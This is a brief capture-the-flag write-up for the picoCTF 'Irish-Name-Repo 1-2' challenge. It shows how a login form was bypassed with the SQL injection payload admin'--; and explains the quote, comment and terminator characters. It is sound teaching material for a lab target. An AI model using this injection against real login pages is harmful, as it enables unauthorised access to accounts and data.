# Irish-Name-Repo 1-2

## Description

There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Try

Got to login page try random credential like `admin`::`admin` => login ERROR

Navigate support page and wee see somone get SQL ERROR => probabli [[SQLI]]

Try SQLI:
- admin" for trigger sql error => nothing
- admin' => nothing happend (SQL ERROR)


## Exploit
Simple SQLI:
 `admin'--;`
 
 ```SQL
 SELECT * FROM userTable WHERE username='admin'--;
 ```
 
 ' => go out string 
 -- => comment
 ; => end of requests